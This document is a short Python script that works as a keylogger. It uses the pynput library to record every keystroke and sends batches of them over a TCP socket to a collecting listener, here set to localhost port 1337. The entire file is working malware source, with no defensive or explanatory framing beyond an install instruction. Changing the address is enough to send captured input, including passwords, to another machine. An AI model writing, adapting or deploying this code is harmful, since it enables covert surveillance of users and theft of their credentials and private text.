'''
install pynput first

sudo pip3 install pynput
'''

import socket
from pynput.keyboard import Key, Listener

ip = '127.0.0.1'  
port = 1337
key_log= {'keylogger':[]}
      
def append_data(key):
    key_log['keylogger'].append(key)
    if len(key_log['keylogger']) >= 11:
        send_data()
        key_log['keylogger']=[]
    else:
        print(key_log['keylogger'])

def send_data():
    data = str("key1337logger ")+str(key_log['keylogger'])
    client_socket.send(data.encode())

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
    client_socket.connect((ip, port))
    while True: 
        with Listener(on_press=append_data) as listener :
            listener.join()


        

        





